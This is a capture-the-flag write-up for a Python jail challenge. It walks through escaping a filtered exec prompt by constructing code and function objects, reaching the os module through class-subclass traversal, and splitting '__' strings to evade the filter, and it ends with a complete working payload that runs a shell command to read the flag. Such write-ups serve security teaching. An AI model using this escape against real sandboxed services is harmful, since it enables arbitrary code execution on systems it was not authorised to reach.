# The Abyss, 160 points

You are able to netcat to a server where you get a Python prompt that execs whatever you enter. However, what you can run is heavily filtered and dangerous functions are filtered from builtins.

The biggest restriction is nothing with `__`, which prevents most Python jail escapes from working. The solution involves creating a code object, and using that to create a function object that you can run to get the flag.

First you have to get constructors for both code and function objects. This can be done through lambda functions: `type(lambda: 0)` for functions and `type((labmda: 0).func_code)` for code objects.

The next step is to create a code object. You can look at the arguments for the constructor with `help(type((lambda: 0).func_code))`. The parameters can easily be matched up with the properties of the `func_code` property of any function, so you can just copy them from a function you create locally that does what you want.

Since it can be assumed the goal is to get a shell, all you need is the `os` module (you can use `os.system`). The `os` module can be gotten through something like `().__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os']`. Simply create a function that returns that and create a code object with the method described above.

The next step is copying the function properties. Once again, you can do the same thing and just find the properties corresponding to the arguments of the constructor.

During this process you will notice some `__` strings, but you can just separate them into single underscores and concatenate so they aren't noticed. Ultimately, you will get a payload that looks something like:
```python
type(lambda: 0)(type((lambda: 0).func_code)(0, 1, 4, 67, 'g\x00\x00d\x04\x00j\x00\x00j\x01\x00j\x02\x00\x83\x00\x00D]\x1b\x00}\x00\x00|\x00\x00j\x03\x00d\x01\x00k\x02\x00r\x13\x00|\x00\x00^\x02\x00q\x13\x00d\x02\x00\x19j\x04\x00j\x05\x00j\x06\x00d\x03\x00\x19j\x07\x00S', (None, 'catch_warnings', 0, 'linecache', ()), ('_''_class_''_', '_''_base_''_', '_''_subclasses_''_', '_''_name_''_', '_''_re''pr_''_', 'im_func', 'func_globals', 'os'), ('x',), '<stdin>', 'os', 1, ''), {'_''_builtins_''_': globals()['_''_builtins_''_']})().system('cat flag.txt')
```